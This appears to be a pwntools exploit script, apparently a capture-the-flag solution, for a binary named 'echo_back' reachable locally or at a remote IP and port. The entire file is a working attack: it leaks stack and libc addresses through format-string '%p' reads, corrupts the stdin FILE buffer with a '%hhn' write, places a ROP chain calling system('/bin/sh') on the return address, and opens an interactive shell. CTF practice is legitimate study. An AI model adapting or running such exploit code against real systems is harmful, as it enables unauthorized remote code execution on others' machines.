from pwn import *
import sys

if len(sys.argv) < 2:
	p = process("./echo_back")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./echo_back")
else:
	p = remote("111.198.29.45","30904")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./echo_back")

def menu(choice):
	p.sendlineafter("choice>> ",str(choice))

def setname(name):
	menu(1)
	p.sendafter("name:",name)

def sendpayload(payload,attack = True):
	menu(2)
	if attack:
		p.sendlineafter("length:",str(len(payload)))
	else:
		p.sendlineafter("length:",str(-1))
	p.send(payload)

def debugf():
	gdb.attach(p,"b printf")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
payload = "%{num}$p\n".format(num = 0x7 - 1 + 6)
sendpayload(payload)
p.recvuntil("anonymous say:")
leak_addr = int(p.recvuntil("\n",drop = True),16)
rip_addr = leak_addr + 8
log.success("rip_addr:" + hex(rip_addr))

payload = "%{num}$p\n".format(num = 0xe - 1 + 6)
sendpayload(payload)
p.recvuntil("anonymous say:")
leak_addr = int(p.recvuntil("\n",drop = True),16)
libc.address = leak_addr - 240 - libc.symbols["__libc_start_main"]
log.success("libc_base:" + hex(libc.address))

target = libc.address + 0x3c4900 + 0x18
setname(p64(target)[:7])
payload = "%{num}$hhn\n".format(num = 0xb - 1 + 6)
sendpayload(payload)
#debugf()
target = rip_addr
menu(2)
payload = p64(libc.symbols["_IO_2_1_stdin_"] + 131) * 3 + p64(target) + p64(target + 0x20)
p.sendafter("length:",payload)
p.sendline("")
for i in range(len(payload) - 1):
	sendpayload("a")
#debugf()
system = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
pop_rdi_ret = libc.address + 0x0000000000021102
payload = p64(pop_rdi_ret) + p64(binsh) + p64(system)
menu(2)
p.sendlineafter("length:",payload)
p.sendline("")
menu(3)
p.interactive()
